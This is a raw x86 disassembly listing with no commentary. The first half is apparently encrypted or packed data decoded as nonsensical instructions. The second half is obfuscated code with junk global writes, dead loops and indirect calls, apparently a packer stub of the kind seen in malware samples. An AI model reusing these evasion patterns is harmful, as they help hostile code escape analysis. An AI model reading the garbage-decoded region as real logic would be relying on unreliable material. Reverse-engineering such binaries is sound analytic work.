  41bd2a:	inc    ebp
  41bd2b:	jmp    0x41bd63
  41bd2d:	jecxz  0x41bd5a
  41bd2f:	(bad)  
  41bd30:	out    0x70,eax
  41bd32:	fadd   DWORD PTR [ecx+0x48]
  41bd35:	sub    DWORD PTR [ebp+0x4a],eax
  41bd38:	mov    ch,0xe1
  41bd3a:	push   ebx
  41bd3b:	dec    eax
  41bd3c:	sub    dl,BYTE PTR [edx]
  41bd3e:	cld    
  41bd3f:	imul   ebx,DWORD PTR [edi-0x50],0x3b
  41bd43:	scas   al,BYTE PTR es:[edi]
  41bd44:	cmp    esi,DWORD PTR [edx+0xa]
  41bd47:	dec    eax
  41bd48:	pop    edi
  41bd49:	and    BYTE PTR [eax-0x38],0x8b
  41bd4d:	cmp    al,0xb1
  41bd4f:	xchg   ebp,eax
  41bd50:	stc    
  41bd51:	cwde   
  41bd52:	cmp    ecx,DWORD PTR [esi-0x2c71b272]
  41bd58:	sbb    BYTE PTR [edi+0x3e],bl
  41bd5b:	addr16 hlt 
  41bd5d:	scas   al,BYTE PTR es:[edi]
  41bd5e:	pop    eax
  41bd5f:	lods   eax,DWORD PTR ds:[esi]
  41bd60:	aas    
  41bd61:	jae    0x41bcf8
  41bd63:	cli    
  41bd64:	add    BYTE PTR [ebp-0x2b],cl
  41bd67:	xchg   esp,eax
  41bd68:	retf   0x53d9
  41bd6b:	mov    eax,0x473022b
  41bd70:	mov    DWORD PTR [esi-0xdb341f9],edi
  41bd76:	xor    cl,BYTE PTR [esi]
  41bd78:	xor    al,0x54
  41bd7a:	push   ebp
  41bd7b:	mov    esi,0x32085cad
  41bd80:	lods   al,BYTE PTR ds:[esi]
  41bd81:	ins    DWORD PTR es:[edi],dx
  41bd82:	cwde   
  41bd83:	add    edi,DWORD PTR cs:[edi-0x7c]
  41bd87:	cmp    BYTE PTR [edx+0x53],ah
  41bd8a:	xor    dh,al
  41bd8c:	call   0x2107:0xca486e4b
  41bd93:	pop    ebx
  41bd94:	fcmovbe st,st(1)
  41bd96:	xor    esp,ebp
  41bd98:	shl    BYTE PTR [edi+0x96c35cd],cl
  41bd9e:	sbb    eax,DWORD PTR [edx]
  41bda0:	sub    cl,dl
  41bda2:	adc    eax,DWORD PTR [edi-0x290db7bb]
  41bda8:	jne    0x41bde4
  41bdaa:	in     al,dx
  41bdab:	mov    ebp,0x65b1433a
  41bdb0:	shr    DWORD PTR [esi-0x466168c2],0x1c
  41bdb7:	mov    ch,0x5e
  41bdb9:	lds    ecx,FWORD PTR [edi+0x12]
  41bdbc:	mov    edi,esi
  41bdbe:	iret   
  41bdbf:	jecxz  0x41bdb9
  41bdc1:	push   ss
  41bdc2:	push   es
  41bdc3:	xchg   edx,eax
  41bdc4:	jnp    0x41bdb2
  41bdc6:	mul    ebx
  41bdc8:	dec    edx
  41bdc9:	pop    eax
  41bdca:	xchg   esp,eax
  41bdcb:	in     al,0xf3
  41bdcd:	inc    eax
  41bdce:	ja     0x41bd6c
  41bdd0:	daa    
  41bdd1:	mov    ah,0xfd
  41bdd3:	cs (bad) 
  41bdd5:	xor    al,0x76
  41bdd7:	out    0x0,eax
  41bdd9:	es push esi
  41bddb:	and    al,0xfa
  41bddd:	fadd   DWORD PTR [edi+ecx*4]
  41bde0:	sbb    BYTE PTR [edi+0x66],0x3c
  41bde4:	mov    ebp,DWORD PTR [ecx-0x17c8a069]
  41bdea:	sub    dh,ah
  41bdec:	sub    eax,eax
  41bdee:	xchg   ebx,eax
  41bdef:	add    BYTE PTR ds:0xd61c8ca5,cl
  41bdf5:	retf   
  41bdf6:	ret    
  41bdf7:	in     al,0xce
  41bdf9:	ficomp DWORD PTR [esi+0x28ed4016]
  41bdff:	sbb    eax,0x864eae79
  41be04:	sub    eax,0xe80865f7
  41be09:	sahf   
  41be0a:	push   es
  41be0b:	leave  
  41be0c:	leave  
  41be0d:	clc    
  41be0e:	dec    eax
  41be0f:	push   ebx
  41be10:	fstp   st(2)
  41be12:	jne    0x41be25
  41be14:	inc    ebx
  41be15:	dec    esp
  41be16:	sar    eax,cl
  41be18:	mov    edi,0x9aab93bf
  41be1d:	(bad)  
  41be1e:	mov    ebp,0xcd38b82e
  41be23:	dec    esp
  41be24:	retf   
  41be25:	cld    
  41be26:	mov    DWORD PTR [eax-0x67],esp
  41be29:	mov    WORD PTR [edi+0x74],ss
  41be2c:	mov    edi,DWORD PTR [ecx]
  41be2e:	xchg   ecx,eax
  41be2f:	scas   eax,DWORD PTR es:[edi]
  41be30:	push   ecx
  41be31:	popf   
  41be32:	leave  
  41be33:	and    BYTE PTR [esi-0x7784a884],0x5e
  41be3a:	mov    ebx,DWORD PTR [edi]
  41be3c:	push   edi
  41be3d:	outs   dx,DWORD PTR ds:[esi]
  41be3e:	enter  0xc6da,0x1d
  41be42:	(bad)  
  41be43:	push   eax
  41be44:	jmp    0xc0f1:0xbc4cef1a
  41be4b:	fbld   TBYTE PTR [edi-0x2992d6be]
  41be51:	lahf   
  41be52:	lods   al,BYTE PTR ds:[esi]
  41be53:	loopne 0x41be7b
  41be55:	add    bh,BYTE PTR cs:[ebx+ecx*1+0x1ac3bb02]
  41be5d:	fdivp  st(5),st
  41be5f:	les    ebp,FWORD PTR [esi-0x2d50703d]
  41be65:	shl    dh,0x3a
  41be68:	or     bl,BYTE PTR [esp+edx*8-0x43]
  41be6c:	jmp    0xd25ca53a
  41be71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be72:	cld    
  41be73:	(bad)  
  41be74:	(bad)
  41be77:	jo     0x41bedc
  41be79:	(bad)  [ecx-0x80feb3e]
  41be7f:	fld    QWORD PTR [eax-0x5d37f7b9]
  41be85:	shl    dh,1
  41be87:	in     al,dx
  41be88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be89:	das    
  41be8a:	mov    eax,0x2c4ab2f5
  41be8f:	mov    al,0xc1
  41be91:	sti    
  41be92:	xchg   BYTE PTR [ebp+0x3d2a5b87],ah
  41be98:	outs   dx,BYTE PTR ds:[esi]
  41be99:	lds    ecx,FWORD PTR [edi-0x7b]
  41be9c:	sbb    dl,BYTE PTR [ecx+0x32]
  41be9f:	pop    ecx
  41bea0:	aaa    
  41bea1:	fucomp st(4)
  41bea3:	popa   
  41bea4:	jno    0x41bf12
  41bea6:	add    BYTE PTR [eax+0x4da44e2e],ah
  41beac:	in     eax,0xc9
  41beae:	mov    dl,0xbd
  41beb0:	sub    BYTE PTR [esi+0x7],dl
  41beb3:	jmp    0xc34b:0xf76fd998
  41beba:	jecxz  0x41bef8
  41bebc:	jg     0x41bece
  41bebe:	cmp    al,0x5c
  41bec0:	pop    ebx
  41bec1:	das    
  41bec2:	iret   
  41bec3:	jecxz  0x41be65
  41bec5:	add    al,0x1a
  41bec7:	cld    
  41bec8:	stos   DWORD PTR es:[edi],eax
  41bec9:	inc    edi
  41beca:	or     al,0x13
  41becc:	mov    ebx,edi
  41bece:	enter  0x13bd,0x91
  41bed2:	out    0xa9,eax
  41bed4:	dec    ebp
  41bed5:	and    BYTE PTR ss:[ebp-0x437d546],cl
  41bedc:	add    DWORD PTR [esi-0x57],edx
  41bedf:	and    DWORD PTR [ebx],esp
  41bee1:	sbb    eax,0x133f9c51
  41bee6:	(bad)  
  41bee7:	pop    edx
  41bee8:	aaa    
  41bee9:	jne    0x41bec9
  41beeb:	mov    DWORD PTR [eax-0x6ede6fac],ebx
  41bef1:	and    BYTE PTR [ecx+0x64f6536],bl
  41bef7:	repz xchg ecx,eax
  41bef9:	push   eax
  41befa:	rcr    DWORD PTR [ecx-0x11],1
  41befd:	push   ss
  41befe:	imul   ecx,eax,0x30196302
  41bf04:	jmp    0xd6d8:0x3afbc73e
  41bf0b:	and    eax,0x7271b984
  41bf10:	mov    esp,0x2750b2f6
  41bf15:	inc    ecx
  41bf16:	xor    BYTE PTR [edi],ch
  41bf18:	and    dh,BYTE PTR [eax+0x7b39fb09]
  41bf1e:	pop    eax
  41bf1f:	cld    
  41bf20:	lods   al,BYTE PTR ds:[esi]
  41bf21:	or     eax,ebx
  41bf23:	mov    ?,WORD PTR [esi]
  41bf25:	fimul  DWORD PTR [esi+0x63]
  41bf28:	aam    0x50
  41bf2a:	fcomp  DWORD PTR [edi+0x4b]
  41bf2d:	fisubr WORD PTR [edx+edi*4-0x65dfe403]
  41bf34:	cwde   
  41bf35:	das    
  41bf36:	xor    DWORD PTR ds:0x3347c48d,0xffffff82
  41bf3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf3e:	addr16 adc eax,ecx
  41bf41:	and    eax,0x94d4344e
  41bf46:	and    BYTE PTR [ecx],dl
  41bf48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf49:	add    al,0x19
  41bf4b:	adc    eax,0x19577de0
  41bf50:	out    dx,al
  41bf51:	sbb    esp,edx
  41bf53:	cwde   
  41bf54:	add    dh,BYTE PTR [ecx]
  41bf56:	jno    0x41bf6c
  41bf58:	scas   eax,DWORD PTR es:[edi]
  41bf59:	pop    ecx
  41bf5a:	mov    DWORD PTR [edi],ebx
  41bf5c:	jne    0x41bf7b
  41bf5e:	les    ebx,FWORD PTR [ecx+0x2719027a]
  41bf64:	jo     0x41bf7d
  41bf66:	cmp    eax,edi
  41bf68:	mov    dh,0xd7
  41bf6a:	jg     0x41bfdc
  41bf6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf6d:	and    bl,BYTE PTR [ebx+0x5fb349df]
  41bf73:	adc    ah,BYTE PTR [eax+0x49dced0e]
  41bf79:	push   0x861493b0
  41bf7e:	or     eax,0x70dcc8ee
  41bf83:	pop    eax
  41bf84:	sar    ecx,1
  41bf86:	xchg   ebx,eax
  41bf87:	pop    ebp
  41bf88:	mov    eax,0x8b114547
  41bf8d:	mov    dl,0xb1
  41bf8f:	popf   
  41bf90:	stc    
  41bf91:	jns    0x41bf91
  41bf93:	sbb    BYTE PTR ds:[ecx-0x4f],ch
  41bf97:	jl     0x41bf1d
  41bf99:	adc    eax,0x90e5c23b
  41bf9e:	int3   
  41bf9f:	cmp    al,0x74
  41bfa1:	jo     0x41bfb9
  41bfa3:	(bad)  
  41bfa4:	and    al,0x25
  41bfa6:	out    0x7,al
  41bfa8:	in     al,dx
  41bfa9:	clc    
  41bfaa:	shl    dh,1
  41bfac:	cmc    
  41bfad:	sub    bh,cl
  41bfaf:	jnp    0x41bfb3
  41bfb1:	cmp    ebx,DWORD PTR [ebx]
  41bfb3:	jmp    FWORD PTR [ecx-0x35]
  41bfb6:	call   0xb5fb1a0d
  41bfbb:	and    DWORD PTR [ebx+0xbd240b9],ecx
  41bfc1:	cmp    al,0x2c
  41bfc3:	push   cs
  41bfc4:	sar    BYTE PTR [ebx],0xc5
  41bfc7:	ror    DWORD PTR [edx-0x21e3756a],1
  41bfcd:	pushf  
  41bfce:	jcxz   0x41c017
  41bfd1:	xchg   esi,eax
  41bfd2:	aam    0x28
  41bfd4:	imul   DWORD PTR [eax-0x7db6d104]
  41bfda:	mov    eax,ds:0x5860ba3b
  41bfdf:	and    DWORD PTR [edi+ecx*1+0x1f47d817],esp
  41bfe6:	mov    ch,0xdc
  41bfe8:	add    al,0x6
  41bfea:	shr    BYTE PTR [eax],1
  41bfec:	mov    edx,0x3557441d
  41bff1:	mov    ds:0xafcefb4f,al
  41bff6:	daa    
  41bff7:	call   FWORD PTR [ecx+0x68]
  41bffa:	cmp    edi,DWORD PTR [edi-0x45]
  41bffd:	mov    WORD PTR [esi],fs
  41bfff:	mov    bl,BYTE PTR [ebx-0x33]
  41c002:	imul   eax,DWORD PTR [esi],0xd13cee1e
  41c008:	push   0x48cf8eb4
  41c00d:	rcr    dl,0x80
  41c010:	push   ebp
  41c011:	shr    DWORD PTR [edx-0x659a0faf],0x17
  41c018:	jmp    0xe2b8:0x97d2baa5
  41c01f:	bound  ebp,QWORD PTR [ebx+ecx*1+0x2d54791a]
  41c026:	pushf  
  41c027:	sbb    BYTE PTR [ebp+0x4f],cl
  41c02a:	mov    eax,ds:0xfb1de561
  41c02f:	ss inc esp
  41c031:	repz jp 0x41c02d
  41c034:	and    BYTE PTR [esi-0x3c],al
  41c037:	push   esi
  41c038:	xor    bh,BYTE PTR [edi]
  41c03a:	imul   dl
  41c03c:	inc    esi
  41c03d:	rcr    DWORD PTR [edi+0x5fc9941f],0xf3
  41c044:	fstp   st(6)
  41c046:	das    
  41c047:	mov    eax,eax
  41c049:	fisttp QWORD PTR [eax+0x56fdda0c]
  41c04f:	xor    al,0x8b
  41c052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c053:	(bad)  
  41c054:	fmul   st,st(0)
  41c056:	mov    ah,BYTE PTR [ebx]
  41c058:	sbb    eax,0xec618fa
  41c05d:	imul   esi,DWORD PTR [eax-0x4546eaa8],0x78
  41c064:	les    edi,FWORD PTR [ebp+ecx*8+0x611b4a9a]
  41c06b:	test   BYTE PTR [ecx],dh
  41c06d:	jecxz  0x41c035
  41c06f:	in     eax,0x2d
  41c071:	sub    cl,BYTE PTR [ecx+esi*8-0x427efe12]
  41c078:	mov    bh,0x1f
  41c07a:	shl    DWORD PTR [edx-0x6430c752],1
  41c080:	sub    BYTE PTR [edi-0x6756c57a],cl
  41c086:	enter  0x22d1,0x9e
  41c08a:	ss mov ecx,ds
  41c08d:	add    BYTE PTR [edx],bl
  41c08f:	ret    
  41c090:	pusha  
  41c091:	stos   BYTE PTR es:[edi],al
  41c092:	mov    ebx,0x10924571
  41c097:	cmc    
  41c098:	(bad)
  41c09e:	pop    ebp
  41c09f:	jmp    0x41c086
  41c0a1:	gs inc edx
  41c0a3:	retf   
  41c0a4:	dec    edx
  41c0a5:	clc    
  41c0a6:	loope  0x41c050
  41c0a8:	dec    ebx
  41c0a9:	sbb    edx,DWORD PTR ds:0xc3f62bdc
  41c0af:	mov    ds:0x3242e7b2,eax
  41c0b4:	mov    ds:0x79508abb,eax
  41c0b9:	jbe    0x41c124
  41c0bb:	inc    edi
  41c0bc:	push   esi
  41c0bd:	xor    al,0x1e
  41c0bf:	jae    0x41c046
  41c0c1:	ins    BYTE PTR es:[edi],dx
  41c0c2:	aaa    
  41c0c3:	pop    ecx
  41c0c4:	push   ecx
  41c0c5:	aaa    
  41c0c6:	das    
  41c0c7:	aaa    
  41c0c8:	test   eax,0x987dc8be
  41c0cd:	aam    0xd7
  41c0cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0d0:	xchg   edi,eax
  41c0d1:	neg    DWORD PTR [eax-0x19]
  41c0d4:	cmp    bl,BYTE PTR [edx]
  41c0d6:	in     al,0x1c
  41c0d8:	mov    edx,0xe5728e78
  41c0dd:	ins    BYTE PTR es:[edi],dx
  41c0de:	adc    al,0x67
  41c0e0:	cmp    BYTE PTR [edx-0x32],ch
  41c0e3:	les    ebx,FWORD PTR [ecx-0x6d]
  41c0e6:	mov    ebp,0x315c59d7
  41c0eb:	or     eax,0xac8afd60
  41c0f0:	or     cl,BYTE PTR [ecx]
  41c0f2:	sbb    BYTE PTR [eax+0x19e53490],bl
  41c0f8:	jmp    0x8b87:0x3d6c1a61
  41c0ff:	dec    ebp
  41c100:	call   0xcf7dbb08
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x430a50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x430a34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x430a18
  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
  41c323:	lea    eax,[esp+0x34]
  41c327:	mov    DWORD PTR [esp+0x44],eax
  41c32b:	mov    esi,DWORD PTR ds:0x428d05
  41c331:	mov    ebx,DWORD PTR ds:0x42af59
  41c337:	sub    esi,ebx
  41c339:	sub    esi,DWORD PTR [esi+ebx*1]
  41c33c:	lea    eax,[esp+0x30]
  41c340:	mov    DWORD PTR [esp+0x28],eax
  41c344:	sub    DWORD PTR ds:0x426ea9,0x492f
  41c34e:	mov    eax,ds:0x4262c9
  41c353:	mov    edx,DWORD PTR ds:0x426ef9
  41c359:	sbb    DWORD PTR ds:0x426f05,edx
  41c35f:	mov    eax,DWORD PTR [eax+0x1c8]
  41c365:	mov    DWORD PTR ds:0x426f29,0x788d
  41c36f:	mov    eax,DWORD PTR [eax]
  41c371:	mov    edx,DWORD PTR [esp+0x28]
  41c375:	and    DWORD PTR ds:0x426efd,0x0
  41c37f:	jmp    0x41c393
  41c384:	xor    esi,esi
  41c386:	xor    esi,DWORD PTR ds:0x426efd
  41c38c:	inc    esi
  41c38d:	mov    DWORD PTR ds:0x426efd,esi
  41c393:	cmp    DWORD PTR ds:0x426efd,0x1a
  41c39a:	jae    0x41c3cb
  41c3a0:	cmp    DWORD PTR ds:0x426efd,0x1c
  41c3a7:	jge    0x41c3cb
  41c3ad:	jmp    0x41c3c6
  41c3b2:	push   DWORD PTR [ebp-0xc]
  41c3b5:	push   0x4c83
  41c3ba:	push   DWORD PTR [ebp-0x14]
  41c3bd:	push   DWORD PTR [ebp-0x1c]
  41c3c0:	call   DWORD PTR ds:0x430a4c
  41c3c6:	jmp    0x41c384
  41c3cb:	mov    esi,0x75108b3
  41c3d0:	and    DWORD PTR ds:0x426e81,0x1564
  41c3da:	xor    eax,esi
  41c3dc:	mov    ebx,0x3272fa
  41c3e1:	add    eax,ebx
  41c3e3:	mov    DWORD PTR [edx],eax
  41c3e5:	mov    DWORD PTR ds:0x426ea1,0x7a67
  41c3ef:	mov    eax,ds:0x426d99
  41c3f4:	mov    DWORD PTR ds:0x426f1d,0x65da
  41c3fe:	cmp    eax,0x455dedfa
  41c403:	mov    DWORD PTR ds:0x426ea9,0x55fc
  41c40d:	jne    0x41c4f5
  41c413:	and    DWORD PTR ds:0x426ef5,0x0
  41c41d:	mov    eax,ds:0x426ef5
  41c422:	inc    eax
  41c423:	mov    ds:0x426ef5,eax
  41c428:	cmp    DWORD PTR ds:0x426ef5,0xd
  41c42f:	jl     0x41c479
  41c435:	jmp    0x41c454
  41c43a:	push   0x59de
  41c43f:	push   0x39ed
  41c444:	push   0x1b7c
  41c449:	push   0x44aa
  41c44e:	call   DWORD PTR ds:0x430a1c
  41c454:	cmp    DWORD PTR ds:0x426ef5,0xc
  41c45b:	jne    0x41c46c
  41c461:	mov    eax,ds:0x426ef5
  41c466:	inc    eax
  41c467:	mov    ds:0x426ef5,eax
  41c46c:	cmp    DWORD PTR ds:0x426ef5,0x1f
  41c473:	jb     0x41c41d
  41c479:	mov    eax,DWORD PTR [esp+0x10]
  41c47d:	xor    edx,DWORD PTR ds:0x426ecd
  41c483:	mov    edx,DWORD PTR ds:0x4262c9
  41c489:	mov    edx,DWORD PTR [edx+0x198]
  41c48f:	add    DWORD PTR ds:0x426ec5,0x6b2
  41c499:	xor    eax,esi
  41c49b:	adc    DWORD PTR ds:0x426f25,0x426ef9
  41c4a5:	add    eax,ebx
  41c4a7:	and    DWORD PTR ds:0x426e85,0x426f15
  41c4b1:	mov    DWORD PTR [edx],eax
  41c4b3:	mov    eax,DWORD PTR [esp+0x10]
  41c4b7:	sub    DWORD PTR ds:0x426ec9,0x4e94
  41c4c1:	xor    eax,esi
  41c4c3:	add    eax,ebx
  41c4c5:	adc    DWORD PTR ds:0x426e81,0x426e91
  41c4cf:	mov    ds:0x426d99,eax
  41c4d4:	mov    eax,DWORD PTR [esp+0x10]
  41c4d8:	adc    DWORD PTR ds:0x426eed,0x426ef9
  41c4e2:	xor    eax,esi
  41c4e4:	add    eax,ebx
  41c4e6:	sub    DWORD PTR ds:0x426ea9,0x426e85
  41c4f0:	mov    ds:0x4263c1,eax
  41c4f5:	mov    eax,ds:0x4262c9
  41c4fa:	sbb    DWORD PTR ds:0x426f05,0x67a3
  41c504:	mov    eax,DWORD PTR [eax+0x18c]
  41c50a:	adc    DWORD PTR ds:0x426e91,0x180f
  41c514:	mov    eax,DWORD PTR [eax]
  41c516:	sbb    DWORD PTR ds:0x426eb1,0x4112
  41c520:	mov    DWORD PTR [esp+0x48],eax
  41c524:	adc    DWORD PTR ds:0x426eb9,edi
  41c52a:	mov    eax,0xf89c85b9
  41c52f:	mov    DWORD PTR [esp+0x38],eax
  41c533:	inc    DWORD PTR ds:0x426e8d
  41c539:	mov    DWORD PTR [esp+0x38],eax
  41c53d:	xor    DWORD PTR ds:0x426f11,0x441e
  41c547:	mov    DWORD PTR [esp+0x38],eax
  41c54b:	mov    DWORD PTR [esp+0x38],ecx
  41c54f:	neg    DWORD PTR ds:0x426f25
  41c555:	mov    DWORD PTR [esp+0x28],eax
  41c559:	movzx  eax,WORD PTR ds:0x426ec5
  41c560:	sbb    eax,DWORD PTR ds:0x426ee1
  41c566:	mov    ds:0x426ec5,eax
  41c56b:	mov    DWORD PTR [esp+0x28],0xf89c85bd
  41c573:	sbb    DWORD PTR ds:0x426ef9,0x58a6
  41c57d:	mov    eax,DWORD PTR [esp+0x10]
  41c581:	xor    eax,esi
  41c583:	add    eax,ebx
  41c585:	jmp    0x41c7a3
  41c58a:	mov    DWORD PTR ds:0x426eb5,0x6384
  41c594:	mov    al,ds:0x42647f
  41c599:	mov    DWORD PTR ds:0x426f01,0x6aa0
  41c5a3:	cmp    al,BYTE PTR ds:0x42648a
  41c5a9:	mov    DWORD PTR ds:0x426e85,0x34fb
  41c5b3:	jne    0x41c211
  41c5b9:	mov    DWORD PTR ds:0x426e99,0x7ac4
  41c5c3:	mov    al,ds:0x42649c
  41c5c8:	cmp    al,BYTE PTR ds:0x4264ab
  41c5ce:	mov    DWORD PTR ds:0x426e99,0x679f
  41c5d8:	jne    0x41c211
  41c5de:	push   0x4264b5
  41c5e3:	or     DWORD PTR ds:0x426e99,0x4d97
  41c5ed:	push   0x4264c5
  41c5f2:	call   edi
  41c5f4:	test   eax,eax
  41c5f6:	mov    DWORD PTR ds:0x426ecd,0x4160
  41c600:	je     0x41c211
  41c606:	mov    DWORD PTR ds:0x426ec5,0x29ef
  41c610:	mov    al,ds:0x4264db
  41c615:	cmp    al,BYTE PTR ds:0x4264e6
  41c61b:	jne    0x41c211
  41c621:	mov    al,ds:0x4264f8
  41c626:	mov    DWORD PTR ds:0x426ecd,0x6d7c
  41c630:	cmp    al,BYTE PTR ds:0x426507
  41c636:	mov    DWORD PTR ds:0x426ee5,0x7eb8
  41c640:	jne    0x41c211
  41c646:	sub    DWORD PTR ds:0x426ef9,0x282b
  41c650:	push   0x426511
  41c655:	push   0x426521
  41c65a:	call   edi
  41c65c:	sbb    DWORD PTR ds:0x426edd,0x426e9d
  41c666:	test   eax,eax
  41c668:	mov    DWORD PTR ds:0x426ee9,0x3f4b
  41c672:	je     0x41c211
  41c678:	and    DWORD PTR ds:0x426e91,0x0
  41c682:	xor    eax,eax
  41c684:	xor    eax,DWORD PTR ds:0x426e91
  41c68a:	inc    eax
  41c68b:	mov    ds:0x426e91,eax
  41c690:	cmp    DWORD PTR ds:0x426e91,0x9
  41c697:	ja     0x41c6d0
  41c69d:	jmp    0x41c6a8
  41c6a2:	call   DWORD PTR ds:0x430a20
  41c6a8:	cmp    DWORD PTR ds:0x426e91,0x8
  41c6af:	jne    0x41c6c3
  41c6b5:	xor    eax,eax
  41c6b7:	add    eax,DWORD PTR ds:0x426e91
  41c6bd:	inc    eax
  41c6be:	mov    ds:0x426e91,eax
  41c6c3:	cmp    DWORD PTR ds:0x426e91,0x1a
  41c6ca:	jb     0x41c682
  41c6d0:	mov    eax,DWORD PTR [esp+0x1c]
  41c6d4:	adc    DWORD PTR ds:0x426f01,ecx
  41c6da:	mov    ecx,DWORD PTR [esp+0x28]
  41c6de:	xor    eax,esi
  41c6e0:	lea    eax,[eax+ecx*1+0x3272fa]
  41c6e7:	push   eax
  41c6e8:	xor    eax,DWORD PTR ds:0x426eb1
  41c6ee:	mov    eax,DWORD PTR [esp+0x3c]
  41c6f2:	adc    DWORD PTR ds:0x426ec1,0x19c6
  41c6fc:	xor    eax,esi
  41c6fe:	sbb    DWORD PTR ds:0x426ec5,0x426ea9
  41c708:	lea    eax,[ebp+eax*1+0x327302]
  41c70f:	xor    DWORD PTR ds:0x426ec1,0x34b0
  41c719:	push   eax
  41c71a:	xor    eax,DWORD PTR ds:0x426e99
  41c720:	mov    eax,ds:0x4262c9
  41c725:	adc    DWORD PTR ds:0x426ea5,0x426f09
  41c72f:	push   DWORD PTR [eax+0x1bc]
  41c735:	adc    DWORD PTR ds:0x426f0d,0x426ea5
  41c73f:	call   0x41d27f
  41c744:	mov    eax,DWORD PTR [esp+0x1c]
  41c748:	mov    ecx,DWORD PTR [esp+0x28]
  41c74c:	xor    eax,esi
  41c74e:	and    DWORD PTR ds:0x426e85,0x0
  41c758:	mov    edx,DWORD PTR ds:0x426e85
  41c75e:	inc    edx
  41c75f:	mov    DWORD PTR ds:0x426e85,edx
  41c765:	cmp    DWORD PTR ds:0x426e85,0x22
